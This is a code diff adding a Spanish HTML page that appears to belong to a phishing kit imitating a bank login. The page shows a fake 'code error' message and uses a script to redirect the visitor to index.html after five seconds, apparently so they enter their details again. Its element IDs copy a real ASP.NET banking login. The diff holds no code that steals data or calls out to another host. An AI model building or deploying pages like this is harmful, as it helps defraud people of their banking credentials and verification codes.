@@ -1,0 +1,209 @@
+<html class=" dkddl_fouc">
+<head id="ctl00_Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=10">
+    <title>
+	
+</title>
+<link href="./archivos/Login.css" type="text/css" rel="stylesheet">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet"/>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.9.3/css/bulma.min.css" rel="stylesheet"/>
+
+						<style>							
+							P.PanelControlTitleStyle
+							{
+ 								font-family:verdana;
+ 								font-size: 12px;
+								font-weight : bold;
+								text-align: center;  								
+							}
+							
+							/* Este elemento debe tener "position: relative" */
+div#is-relative{
+  max-width: 420px;
+  position: relative;
+}
+
+/* El icono debe ser "position: absolute"
+ * Ademas le damos un "display: block" y lo posicionamos */
+#icon{
+  position: absolute;
+  display: block;
+  bottom: .5rem;
+  left: 1rem;
+  
+  user-select: none;
+  cursor: pointer;
+}
+input.input{
+  padding-left: 2.5rem;
+}
+						</style>
+
+
+ <script type="text/javascript">
+    
+			   
+						var tiempo=5;
+						  var url="index.html";
+					 
+						function updateReloj()
+						{
+							document.getElementById('contador').innerHTML = " ";
+					 
+							if(tiempo==0)
+							{
+								window.location=url;
+																			
+							}else{
+								tiempo-=1;
+								setTimeout("updateReloj()",1000);
+							}
+						}
+					   window.onload=updateReloj;
+            </script>
+
+</head>
+
+<body style=" background-color:#ffffff; background-attachment:fixed;
+	background-size: 100% 100%;	">
+		
+	
+    <form method="post" action="#">
+	
+
+
+    <div class="contenedorgenerico">
+       
+       
+        <div class="login-container">
+
+
+    <div class="logo-ban" >
+        
+    <div align="center">	
+	<table border="0">
+		<tr><td width="100px">X CERRAR</td>
+		
+		<td width="400px"> <div align="center"><img src="archivos/images.png" style="width:150px;"></div></td>
+		
+		<td width="100px"><span style="font-family:arial">Continuar ></span></td></tr>
+			</table>
+			
+		 <br>
+		<span style="font-family:arial; font-size:26"><b></b></span>
+		 <br><br>
+		 <span style="font-family:arial; font-size:18"></span>
+		 <br>
+	 </div>
+    </div>
+    <div id="dimmer">
+        
+                <div id="ctl00_MainHolder_authenticate_firsStep_panel" onkeypress="javascript:return WebForm_FireDefaultButton(event,
+				&#39;ctl00_MainHolder_linkButton_SecondStep&#39;)" style="text-align:center;padding-top: 5px">
+	
+                    <div align="center">
+                        <table class="" cellpadding="0" cellspacing="0">
+                            <tbody><tr>
+                                <td>
+                                    <table class="" cellpadding="0" cellspacing="0" style="align-content:center">
+                                        <tbody>
+                                        <tr>
+                                            <td>
+                                                <table cellpadding="0" cellspacing="0" class="" style="height: 372px">
+                                                    <tbody><tr class="ingrese_su_nombre_de_Usuario">
+                                                        <td>
+                                                            <div align="center">
+                                                              
+                                                                <div class="requerido">
+                                                                    
+		
+	<div align="center">	
+			<span style="font-size:30px;color:#ffffff;"></span><br><br>
+			<img src="archivos/ror.png" style="width:100px;">
+			
+			<br><br>
+			
+				<div align="center"  style="color:red;font-size:20px;">¡ERROR DE CÓDIGO!</div><br>
+				
+				                     <div style="text-align: center;font-size:18px;" align="center">
+                        <font id="contador" style=" font-size:28px;"></font> <br><b>¡DEBE REALIZAR EL PROCESO NUEVAMENTE!</b><br>
+					</div>
+			<br><br>
+			
+				
+						
+		</div>
+																			
+																		
+																	 <br><br>
+																	 
+																	  &nbsp;
+																	 
+																	 <br><br>
+																	 
+																	 
+																	 
+														
+																	
+																	<br><br><br><br><br>
+															
+                                                                </div>
+                                                               
+                                                            </div>
+                                                        </td>
+                                                    </tr>
+                                                    <tr>
+                                                        
+                                                    </tr>
+                                                    <tr>
+                                                        <td>
+                                                        </td>
+                                                    </tr>
+                                                </tbody></table>
+                                            </td>
+                                        </tr>
+                                    </tbody></table>
+                                </td>
+                                
+                            </tr>
+                        </tbody></table>
+						
+						 		<div align="center">
+                                     
+																	<table>
+																	<tr><td><img src="archivos/raya1.png" style="width:600px"></td>
+																		</tr>
+																		
+																		
+																	
+																	</table>
+																	
+																	</div>
+                      
+                        <table class="tabla-login-teclado" cellpadding="0" cellspacing="0">
+                            <tbody><tr>
+                                <td>
+                                    
+                                </td>
+                            </tr>
+                        </tbody>
+						</table>
+                    </div>
+         
+</div>
+            
+    </div>
+  
+
+        </div>
+     </div>  
+   
+
+</form>
+
+
+   
+
+</body></html>
